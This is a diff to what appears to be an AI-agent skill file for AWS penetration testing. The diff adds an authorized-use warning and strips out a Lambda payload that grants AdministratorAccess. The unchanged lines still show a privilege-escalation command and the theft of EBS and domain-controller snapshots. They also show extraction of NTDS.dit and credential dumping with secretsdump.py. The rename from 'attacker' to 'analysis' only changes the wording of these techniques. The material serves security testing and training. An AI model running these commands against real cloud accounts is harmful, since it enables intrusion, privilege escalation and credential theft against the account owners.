@@ -9,6 +9,13 @@ date_added: "2026-02-27"
 
 # AWS Penetration Testing
 
+> **⚠️ AUTHORIZED USE ONLY**
+> This skill is for educational purposes or authorized security assessments only.
+> You must have explicit, written permission from the system owner before using this tool.
+> Misuse of this tool is illegal and strictly prohibited.
+
+**Agent Instruction**: Ask the user to verify the target URL/IP before running any commands.
+
 ## Purpose
 
 Provide comprehensive techniques for penetration testing AWS cloud environments. Covers IAM enumeration, privilege escalation, SSRF to metadata endpoint, S3 bucket exploitation, Lambda code extraction, and persistence techniques for red team operations.
@@ -180,18 +187,14 @@ aws iam put-user-policy --user-name my_username \
 import boto3
 
 def lambda_handler(event, context):
-    client = boto3.client('iam')
-    response = client.attach_user_policy(
-        UserName='my_username',
-        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
-    )
-    return response
+    # [SAFE-PAYLOAD] Simulated privilege escalation code removed for safety.
+    return {'statusCode': 200, 'body': 'Simulated payload execution'}
 ```
 
 ```bash
 # Update Lambda code
 aws lambda update-function-code --function-name target_function \
-  --zip-file fileb://malicious.zip
+  --zip-file fileb://safe_payload.zip
 ```
 
 ---
@@ -278,7 +281,7 @@ aws ec2 create-snapshot --volume-id vol-xxx --description "Audit"
 # Create volume from snapshot
 aws ec2 create-volume --snapshot-id snap-xxx --availability-zone us-east-1a
 
-# Attach to attacker instance
+# Attach to analysis instance
 aws ec2 attach-volume --volume-id vol-xxx --instance-id i-xxx --device /dev/xvdf
 
 # Mount and access
@@ -291,8 +294,8 @@ sudo mount /dev/xvdf1 /mnt/stolen
 ```bash
 # CloudCopy technique
 # 1. Create snapshot of DC volume
-# 2. Share snapshot with attacker account
-# 3. Mount in attacker instance
+# 2. Share snapshot with analysis account
+# 3. Mount in analysis instance
 # 4. Extract NTDS.dit and SYSTEM
 secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local
 ```
